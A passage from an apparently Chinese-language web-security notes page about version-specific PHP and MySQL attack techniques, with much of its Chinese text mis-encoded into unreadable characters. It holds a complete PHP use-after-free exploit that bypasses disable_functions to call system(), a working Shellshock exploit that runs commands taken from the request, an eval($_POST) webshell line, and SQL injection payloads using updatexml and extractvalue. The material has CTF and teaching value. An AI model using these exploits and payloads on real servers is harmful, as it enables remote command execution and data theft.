class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> $data_addr + $i * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params">$binary_leak</span>) </span>&#123;</span><br><span class="line">        $base = <span class="number">0</span>;</span><br><span class="line">        $start = $binary_leak &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x1000</span>; $i++) &#123;</span><br><span class="line">            $addr = $start - <span class="number">0x1000</span> * $i;</span><br><span class="line">            $leak = leak($addr, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> $addr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params">$basic_funcs</span>) </span>&#123;</span><br><span class="line">        $addr = $basic_funcs;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            $f_entry = leak($addr);</span><br><span class="line">            $f_name = leak($f_entry, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($f_name == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> leak($addr + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $addr += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>($f_entry != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ryat</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $ryat;</span><br><span class="line">        <span class="keyword">var</span> $chtg;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;chtg = <span class="keyword">$this</span>-&gt;ryat;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ryat = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $a, $b, $c, $d;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(stristr(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $n_alloc = <span class="number">10</span>; <span class="comment"># increase this value if you get segfaults</span></span><br><span class="line"></span><br><span class="line">    $contiguous = [];</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n_alloc; $i++)</span><br><span class="line">        $contiguous[] = str_repeat(<span class="string">&#x27;A&#x27;</span>, <span class="number">79</span>);</span><br><span class="line"></span><br><span class="line">    $poc = <span class="string">&#x27;a:4:&#123;i:0;i:1;i:1;a:1:&#123;i:0;O:4:&quot;ryat&quot;:2:&#123;s:4:&quot;ryat&quot;;R:3;s:4:&quot;chtg&quot;;i:2;&#125;&#125;i:1;i:3;i:2;R:5;&#125;&#x27;</span>;</span><br><span class="line">    $out = unserialize($poc);</span><br><span class="line">    gc_collect_cycles();</span><br><span class="line"></span><br><span class="line">    $v = [];</span><br><span class="line">    $v[<span class="number">0</span>] = ptr2str(<span class="number">0</span>, <span class="number">79</span>);</span><br><span class="line">    <span class="keyword">unset</span>($v);</span><br><span class="line">    $abc = $out[<span class="number">2</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    $helper = <span class="keyword">new</span> Helper;</span><br><span class="line">    $helper-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params">$x</span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(strlen($abc) == <span class="number">79</span> || strlen($abc) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    $closure_handlers = str2ptr($abc, <span class="number">0</span>);</span><br><span class="line">    $php_heap = str2ptr($abc, <span class="number">0x58</span>);</span><br><span class="line">    $abc_addr = $php_heap - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    write($abc, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    write($abc, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    write($abc, <span class="number">0x10</span>, $abc_addr + <span class="number">0x60</span>);</span><br><span class="line">    write($abc, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    $closure_obj = str2ptr($abc, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    $binary_leak = leak($closure_handlers, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!($base = get_binary_base($binary_leak))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($elf = parse_elf($base))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($zif_system = get_system($basic_funcs))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    $fake_obj_offset = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x110</span>; $i += <span class="number">8</span>) &#123;</span><br><span class="line">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    write($abc, <span class="number">0x20</span>, $abc_addr + $fake_obj_offset);</span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x68</span>, $zif_system); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">    ($helper-&gt;b)($cmd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨å¯ä»¥è¿æ¥çš„æƒ…å†µä¸‹ï¼Œå°†pocä¸Šä¼ åˆ°<code>/tmp/</code> ç›®å½•ä¸‹ï¼Œç„¶ååŒ…å«ä»–ã€‚</p><p>æ¯”å¦‚ GKCTF2020 Checkin ï¼ŒGYCTF2020 EasyThinkä¹Ÿæ˜¯ ä¸€æ ·çš„bypassæ€è·¯ã€‚å…ˆæ˜¯<code>Ginkgo=eval($_POST[1]);</code> ç„¶åASè¿ä¸Šåï¼Œåœ¨<code>/tmp/</code>ç›®å½•ä¸Šä¸Šä¼ expã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200526231323.png"></p><h4 id="LD-PRELOAD-åŠ«æŒ"><a href="#LD-PRELOAD-åŠ«æŒ" class="headerlink" title="LD_PRELOAD åŠ«æŒ"></a>LD_PRELOAD åŠ«æŒ</h4><blockquote><p>åˆ©ç”¨ç¯å¢ƒå˜é‡ LD_PRELOAD åŠ«æŒç³»ç»Ÿå‡½æ•°ï¼Œè®©å¤–éƒ¨ç¨‹åºåŠ è½½æ¶æ„ *.so</p></blockquote><h4 id="ImageMagick-vuln-bypass"><a href="#ImageMagick-vuln-bypass" class="headerlink" title="ImageMagick vuln bypass"></a>ImageMagick vuln bypass</h4><p>ä¹Ÿå°±æ˜¯<strong>åˆ©ç”¨å­˜åœ¨æ¼æ´çš„ç»„ä»¶ï¼Œæ‰©å±•ã€‚</strong></p><h4 id="Mod-cgi"><a href="#Mod-cgi" class="headerlink" title="Mod_cgi"></a>Mod_cgi</h4><blockquote><p>ä¿®æ”¹ .htaccessï¼Œè°ƒæ•´è¯·æ±‚è®¿é—®è·¯ç”±ï¼Œç»•è¿‡ php.ini ä¸­çš„ä»»ä½•é™åˆ¶ï¼ˆè®©ç‰¹å®šæ‰©å±•åçš„æ–‡ä»¶ç›´æ¥å’Œphp-cgié€šiä¿¡</p></blockquote><h4 id="Windows-ç³»ç»Ÿç»„ä»¶-COM"><a href="#Windows-ç³»ç»Ÿç»„ä»¶-COM" class="headerlink" title="Windows ç³»ç»Ÿç»„ä»¶ COM"></a>Windows ç³»ç»Ÿç»„ä»¶ COM</h4><p>åœ¨<code>c:/System32/</code> ä¸‹çš„ä¸€ä¸ª<code>wshom.ocx</code> æ–‡ä»¶ã€‚</p><h4 id="PHP-7-4-FFI-Bypass"><a href="#PHP-7-4-FFI-Bypass" class="headerlink" title="PHP 7.4 FFI Bypass"></a>PHP 7.4 FFI Bypass</h4><blockquote><p>FFIï¼ˆForeign Function Interfaceï¼‰ï¼Œå³å¤–éƒ¨å‡½æ•°æ¥å£ï¼Œå…è®¸ä»ç”¨æˆ·åŒºè°ƒç”¨Cä»£ç ã€‚ç®€å•åœ°è¯´ï¼Œå°±æ˜¯ä¸€é¡¹è®©ä½ åœ¨PHPé‡Œèƒ½å¤Ÿè°ƒç”¨Cä»£ç çš„æŠ€æœ¯ã€‚</p></blockquote><p>å½“PHPæ‰€æœ‰çš„å‘½ä»¤æ‰§è¡Œå‡½æ•°è¢«ç¦ç”¨åï¼Œé€šè¿‡PHP 7.4çš„æ–°ç‰¹æ€§FFIå¯ä»¥å®ç°ç”¨PHPä»£ç è°ƒç”¨Cä»£ç çš„æ–¹å¼ï¼Œå…ˆå£°æ˜Cä¸­çš„å‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼Œç„¶åå†é€šè¿‡FFIå˜é‡è°ƒç”¨è¯¥Cå‡½æ•°å³å¯Bypass disable_functionsã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œé€šè¿‡PHPè°ƒç”¨Cçš„å‘½ä»¤æ‰§è¡Œå‡½æ•°æ¥ç»•è¿‡ã€‚</p><p>éœ€è¦æ»¡è¶³ï¼š</p><ol><li><code>opcache.preload</code> å¯ç”¨. (æŒ‡å®šå°†åœ¨æœåŠ¡å™¨å¯åŠ¨æ—¶ç¼–è¯‘å’Œæ‰§è¡Œçš„PHPæ–‡ä»¶ï¼Œæ–‡ä»¶ä¸­å®šä¹‰çš„æ‰€æœ‰å‡½æ•°å’Œå¤§å¤šæ•°ç±»éƒ½å°†æ°¸ä¹…åŠ è½½åˆ° PHP çš„å‡½æ•°å’Œç±»è¡¨ä¸­ï¼Œå¹¶åœ¨å°†æ¥çš„ä»»ä½•è¯·æ±‚çš„ä¸Šä¸‹æ–‡ä¸­æ°¸ä¹…å¯ç”¨)ã€‚</li><li><code>FFI support = enable</code>ã€‚</li></ol><p>ä¾‹é¢˜ï¼š[RCTF 2019]Nextphp</p><p><a href="https://hack-for.fun/posts/38da.html">https://hack-for.fun/posts/38da.html</a></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200527134039.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200526231206.png"></p><p><a href="https://www.php.net/manual/en/ffi.examples-basic.php">https://www.php.net/manual/en/ffi.examples-basic.php</a></p><p><a href="https://3nd.xyz/2019/11/06/Memo/bypass-disable-functions/#0x04-PHP-7-4-FFI">https://3nd.xyz/2019/11/06/Memo/bypass-disable-functions/#0x04-PHP-7-4-FFI</a></p><h4 id="Bash-ShellShock"><a href="#Bash-ShellShock" class="headerlink" title="Bash ShellShock"></a>Bash ShellShock</h4><p>åˆ©ç”¨æ–¹æ³•çš„å‰ææ˜¯ç›®æ ‡ OS å­˜åœ¨ Bashç ´å£³ï¼ˆCVE-2014-6271ï¼‰æ¼æ´ï¼Œè¯¥æ¼æ´çš„å…·ä½“ä»‹ç»å¯å‚è€ƒ: <a href="https://www.freebuf.com/news/48331.html">ç ´å£³æ¼æ´ï¼ˆCVE-2014-6271ï¼‰ç»¼åˆåˆ†æï¼šâ€œç ´å£³â€æ¼æ´ç³»åˆ—åˆ†æä¹‹ä¸€</a></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200527135528.png"></p><p><strong>Bash ç ´å£³æ¼æ´æˆå› </strong>ï¼šç›®å‰çš„ Bash ä½¿ç”¨çš„ç¯å¢ƒå˜é‡æ˜¯é€šè¿‡å‡½æ•°åç§°æ¥è°ƒç”¨çš„ï¼Œå¯¼è‡´æ¼æ´å‡ºé—®é¢˜æ˜¯ä»¥ <code>()&#123;</code> å¼€å¤´å®šä¹‰çš„ç¯å¢ƒå˜é‡åœ¨å‘½ä»¤ ENV ä¸­è§£ææˆå‡½æ•°åï¼ŒBash æ‰§è¡Œå¹¶æœªé€€å‡ºï¼Œè€Œæ˜¯ç»§ç»­è§£æå¹¶æ‰§è¡Œ shell å‘½ä»¤ã€‚è€Œå…¶æ ¸å¿ƒçš„åŸå› åœ¨äºåœ¨è¾“å…¥çš„è¿‡æ»¤ä¸­æ²¡æœ‰ä¸¥æ ¼é™åˆ¶è¾¹ç•Œï¼Œä¹Ÿæ²¡æœ‰åšå‡ºåˆæ³•åŒ–çš„å‚æ•°åˆ¤æ–­ã€‚</p><p>å¥½åƒAntSword è™šæ‹Ÿç»ˆç«¯å·²ç»å°†è¿™ä¸ªæ¼æ´ä½œä¸ºé»˜è®¤ä½¿ç”¨äº†ã€‚</p><p>EXPï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">?php </span><br><span class="line"><span class="comment"># Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) </span></span><br><span class="line"><span class="comment"># Google Dork: none </span></span><br><span class="line"><span class="comment"># Date: 10/31/2014 </span></span><br><span class="line"><span class="comment"># Exploit Author: Ryan King (Starfall) </span></span><br><span class="line"><span class="comment"># Vendor Homepage: http://php.net </span></span><br><span class="line"><span class="comment"># Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror </span></span><br><span class="line"><span class="comment"># Version: 5.* (tested on 5.6.2) </span></span><br><span class="line"><span class="comment"># Tested on: Debian 7 and CentOS 5 and 6 </span></span><br><span class="line"><span class="comment"># CVE: CVE-2014-6271 </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shellshock</span>(<span class="params">$cmd</span>) </span>&#123; <span class="comment">// Execute a command via CVE-2014-6271 @mail.c:283 </span></span><br><span class="line">   $tmp = tempnam(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;data&quot;</span>); </span><br><span class="line">   putenv(<span class="string">&quot;PHP_LOL=() &#123; x; &#125;; $cmd &gt;$tmp 2&gt;&amp;1&quot;</span>); </span><br><span class="line">   <span class="comment">// In Safe Mode, the user may only alter environment variableswhose names </span></span><br><span class="line">   <span class="comment">// begin with the prefixes supplied by this directive. </span></span><br><span class="line">   <span class="comment">// By default, users will only be able to set environment variablesthat </span></span><br><span class="line">   <span class="comment">// begin with PHP_ (e.g. PHP_FOO=BAR). <span class="doctag">Note:</span> if this directive isempty, </span></span><br><span class="line">   <span class="comment">// PHP will let the user modify ANY environment variable! </span></span><br><span class="line">   mail(<span class="string">&quot;a@127.0.0.1&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;-bv&quot;</span>); <span class="comment">// -bv so we don&#x27;t actuallysend any mail </span></span><br><span class="line">   $output = @file_get_contents($tmp); </span><br><span class="line">   @unlink($tmp); </span><br><span class="line">   <span class="keyword">if</span>($output != <span class="string">&quot;&quot;</span>) <span class="keyword">return</span> $output; </span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">return</span> <span class="string">&quot;No output, or not vuln.&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">echo</span> shellshock($_REQUEST[<span class="string">&quot;cmd&quot;</span>]); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="å¯»æ‰¾æ¼ç½‘ä¹‹é±¼"><a href="#å¯»æ‰¾æ¼ç½‘ä¹‹é±¼" class="headerlink" title="å¯»æ‰¾æ¼ç½‘ä¹‹é±¼"></a>å¯»æ‰¾æ¼ç½‘ä¹‹é±¼</h4><p>â€¦è‡ªè¡Œé¢†ä¼šã€‚</p><hr><p><a href="https://github.com/l3m0n/Bypass_Disable_functions_Shell/blob/master/paper/readme.old.md">https://github.com/l3m0n/Bypass_Disable_functions_Shell/blob/master/paper/readme.old.md</a></p><p><a href="https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html">https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html</a></p><p><a href="https://3nd.xyz/2019/11/06/Memo/bypass-disable-functions/">https://3nd.xyz/2019/11/06/Memo/bypass-disable-functions/</a></p><p><a href="https://www.mi1k7ea.com/2019/06/02/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-disable-functions%E7%9A%84%E6%96%B9%E6%B3%95/">https://www.mi1k7ea.com/2019/06/02/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-disable-functions%E7%9A%84%E6%96%B9%E6%B3%95/</a></p><h2 id="XXE-PHP-7-0-30"><a href="#XXE-PHP-7-0-30" class="headerlink" title="XXE - PHP 7.0.30"></a>XXE - PHP 7.0.30</h2><ul><li>Php 7.0.30</li><li>Libxml 2.8.0</li></ul><p><strong>libxml2.9.0ä»¥åï¼Œé»˜è®¤ä¸è§£æå¤–éƒ¨å®ä½“ï¼Œå¯¼è‡´XXEæ¼æ´é€æ¸æ¶ˆäº¡ã€‚</strong></p><ul><li>SimpleXMLElement</li><li>loadXML</li><li>simplexml_load_string</li></ul><h2 id="unserialize-serialize"><a href="#unserialize-serialize" class="headerlink" title="unserialize/serialize"></a>unserialize/serialize</h2><ul><li><p>php 7.1.xï½7.3.xï¼ˆå…·ä½“ä¸çŸ¥ï¼Œphp7.x å¥½åƒéƒ½å¯ä»¥ï¼Œé‡åˆ°æ—¶ï¼Œè¯•ä¸€ä¸‹å°±å¯ä»¥ã€‚</p><p>å¯¹å±æ€§ç±»å‹ä¸æ•æ„Ÿï¼Œå¯ç›´æ¥å°†å±æ€§æ”¹ä¸ºpublicï¼Œå‡è½»ç¼–å†™payloadçš„è´Ÿæ‹…ã€‚</p></li><li><p>php &lt; 5.6.25 &amp;&amp; php &lt; 7.0.10</p></li></ul><p><code>__wakeup</code> å¯ç»•è¿‡ã€‚ç»•è¿‡æ–¹æ³•ï¼šå½“å¯¹è±¡å±æ€§ä¸ªæ•°å¤§äºçœŸå®å±æ€§ä¸ªæ•°æ—¶ã€‚</p><h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><p>ä¸åŒç‰ˆæœ¬çš„mysql ä¸»è¦åœ¨â€é«˜çº§â€œ æ³¨å…¥æƒ…å†µä¸‹ï¼Œ</p><p><a href="https://xz.aliyun.com/t/7169#toc-3">https://xz.aliyun.com/t/7169#toc-3</a> ã€‚ è†œä¸€æ³¢Yunenå¸ˆå‚…ã€‚</p><h3 id="Mysql-lt-5-0-é¢è¯•å¸¸é—®"><a href="#Mysql-lt-5-0-é¢è¯•å¸¸é—®" class="headerlink" title="Mysql &lt; 5.0(é¢è¯•å¸¸é—®)"></a>Mysql &lt; 5.0(é¢è¯•å¸¸é—®)</h3><p>ç”±äºmysqlçš„ä½ç‰ˆæœ¬ç¼ºä¹ç³»ç»Ÿåº“<strong>information_schema</strong>ï¼Œæ•…é€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬æ— æ³•ç›´æ¥æŸ¥è¯¢è¡¨åï¼Œå­—æ®µ(åˆ—)åç­‰ä¿¡æ¯ï¼Œè¿™æ—¶å€™åªèƒ½é <strong>çŒœ</strong>æ¥è§£å†³ã€‚</p><p>ç›´æ¥çŒœè¡¨åä¸åˆ—åæ˜¯ä»€ä¹ˆï¼Œç”šè‡³æ˜¯åº“åï¼Œå†ä½¿ç”¨è”åˆæŸ¥è¯¢å–æ•°æ®ã€‚</p><p>è‹¥çŸ¥é“ä»…è¡¨åè€Œä¸çŸ¥é“åˆ—(å­—æ®µ)åï¼š</p><p>å¯é€šè¿‡ä»¥ä¸‹payloadï¼š</p><ul><li>è‹¥å¤šå­—æ®µï¼šselect <code>x</code> from(select 1,2,3,4,xxx from table_name union select * from table_name)a</li><li>è‹¥å•å­—æ®µï¼šselect *,1,2,xxx from table_name</li></ul><h3 id="Mysql-gt-5-0ï¼ˆé¢è¯•å¸¸é—®"><a href="#Mysql-gt-5-0ï¼ˆé¢è¯•å¸¸é—®" class="headerlink" title="Mysql &gt;= 5.0ï¼ˆé¢è¯•å¸¸é—®"></a>Mysql &gt;= 5.0ï¼ˆé¢è¯•å¸¸é—®</h3><p>é¦–å…ˆå»ä¸€ä¸ªåä¸º<strong>information_schema</strong>çš„æ•°æ®åº“é‡Œçš„<strong>shemata</strong>æ•°æ®è¡¨æŸ¥è¯¢<strong>å…¨éƒ¨æ•°æ®åº“å</strong>ã€‚</p><p>è‹¥ä¸éœ€è¦è·¨æ•°æ®åº“çš„è¯ï¼Œå¯ç›´æ¥è·³è¿‡æ­¤æ­¥éª¤ï¼Œç›´æ¥æŸ¥è¯¢ç›¸åº”çš„æ•°æ®åº“ä¸‹çš„å…¨éƒ¨æ•°æ®è¡¨åã€‚</p><p>åœ¨information_schemaçš„ä¸€ä¸ªåä¸º<strong>tables</strong>çš„æ•°æ®è¡¨ä¸­å­˜ç€å…¨éƒ¨çš„<strong>æ•°æ®è¡¨ä¿¡æ¯</strong>ã€‚</p><p>å…¶ä¸­ï¼Œ<strong>table_name å­—æ®µä¿å­˜å…¶åç§°</strong>ï¼Œ<strong>table_schemaä¿å­˜å…¶å¯¹åº”çš„æ•°æ®åº“å</strong>ã€‚</p><p>æ¥ç€é€šè¿‡å…¶è¡¨åï¼ŒæŸ¥è¯¢è¯¥è¡¨çš„æ‰€æœ‰å­—æ®µåï¼Œæœ‰æ—¶ä¹Ÿç§°åˆ—åã€‚</p><p>é€šè¿‡information_schemaåº“ä¸‹çš„<strong>columns</strong>è¡¨å¯æŸ¥è¯¢å¯¹åº”çš„æ•°æ®åº“/æ•°æ®åº“è¡¨å«æœ‰çš„å­—æ®µåã€‚</p><blockquote><p>5.0ä»¥ä¸‹æ²¡æœ‰information_schemaè¿™ä¸ªç³»ç»Ÿè¡¨ï¼Œæ— æ³•åˆ—è¡¨åç­‰ï¼Œåªèƒ½æš´åŠ›è·‘è¡¨<br>åï¼›5.0ä»¥ä¸‹æ˜¯å¤šç”¨æˆ·å•æ“ä½œï¼Œ5.0ä»¥ä¸Šæ˜¯å¤šç”¨æˆ·å¤šæ“åšã€‚</p></blockquote><h3 id="exp-pow-æŠ¥é”™æ³¨å…¥"><a href="#exp-pow-æŠ¥é”™æ³¨å…¥" class="headerlink" title="exp()/pow() æŠ¥é”™æ³¨å…¥"></a>exp()/pow() æŠ¥é”™æ³¨å…¥</h3><p>Mysql 5.5.5~5.5.49</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MySQL [(none)]&gt; select exp(3);</span><br><span class="line">+--------------------+</span><br><span class="line">| exp(3)             |</span><br><span class="line">+--------------------+</span><br><span class="line">| 20.085536923187668 |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set (0.04 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; select exp(999);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(999)&#39;</span><br></pre></td></tr></table></figure><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MySQL [(none)]&gt; select pow(9,99);</span><br><span class="line">+-----------------------+</span><br><span class="line">| pow(9,99)             |</span><br><span class="line">+-----------------------+</span><br><span class="line">| 2.9512665430652752e94 |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; select pow(9,999);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#39;pow(9,999)&#39;</span><br></pre></td></tr></table></figure><h3 id="updatexml-æŠ¥é”™æ³¨å…¥"><a href="#updatexml-æŠ¥é”™æ³¨å…¥" class="headerlink" title="updatexml() æŠ¥é”™æ³¨å…¥"></a>updatexml() æŠ¥é”™æ³¨å…¥</h3><p>Mysql 5.1.5+</p><p>ä¸exp()ä¸åŒï¼Œupdatexmlæ˜¯ç”±äºå‚æ•°çš„æ ¼å¼ä¸æ­£ç¡®è€Œäº§ç”Ÿçš„é”™è¯¯ï¼ŒåŒæ ·ä¹Ÿä¼šè¿”å›å‚æ•°çš„ä¿¡æ¯ã€‚</p><p>payload: <code>updatexml(1,concat(0x7e,(select user()),0x7e),1)</code></p><p>å‰åæ·»åŠ ~ä½¿å…¶ä¸ç¬¦åˆxpathæ ¼å¼ä»è€ŒæŠ¥é”™ã€‚</p><h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><p>å‡½æ•°è¯­æ³•ï¼š<code>EXTRACTVALUE (XML_document, XPath_string);</code></p><p>é€‚ç”¨ç‰ˆæœ¬ï¼š5.1.5+</p><p>åˆ©ç”¨åŸç†ä¸updatexmlå‡½æ•°ç›¸åŒ</p><p>payload: <code>and (extractvalue(1,concat(0x7e,(select user()),0x7e)))</code></p><h3 id="æ–‡ä»¶è¯»å†™"><a href="#æ–‡ä»¶è¯»å†™" class="headerlink" title="æ–‡ä»¶è¯»å†™"></a>æ–‡ä»¶è¯»å†™</h3><ul><li><code>file_priv</code> ç”¨æˆ·çš„æ–‡ä»¶è¯»å†™æƒé™ã€‚</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select file_priv from mysql.user where user&#x3D;$USER host&#x3D;$HOST;</span><br></pre></td></tr></table></figure><ul><li><code>secure-file-priv</code>ç³»ç»Ÿå˜é‡ï¼Œå¯¹æ–‡ä»¶è¯»/å†™åŠŸèƒ½è¿›è¡Œé™åˆ¶<ul><li>æ— å†…å®¹ï¼Œè¡¨ç¤ºæ— é™åˆ¶ã€‚</li><li>ä¸ºNULLï¼Œè¡¨ç¤ºç¦æ­¢æ–‡ä»¶è¯»/å†™ã€‚</li></ul></li><li>ä¸ºç›®å½•åï¼Œè¡¨ç¤ºä»…å…è®¸å¯¹ç‰¹å®šç›®å½•çš„æ–‡ä»¶è¿›è¡Œè¯»/å†™ã€‚</li></ul><p>mysql 5.5.53 